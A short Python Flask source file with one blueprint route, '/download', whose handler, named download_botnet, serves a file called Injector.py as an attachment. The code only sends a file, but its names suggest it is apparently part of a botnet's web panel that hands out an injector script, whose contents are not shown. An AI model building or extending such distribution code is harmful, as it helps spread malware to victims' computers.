from flask import Blueprint, render_template, request, redirect, url_for, flash, session, send_file

download = Blueprint('download', __name__, template_folder='templates', static_folder='static')
@download.route('/download')
def download_botnet():

    path = "..\Injector\Injector.py"

    return send_file(path, as_attachment=True)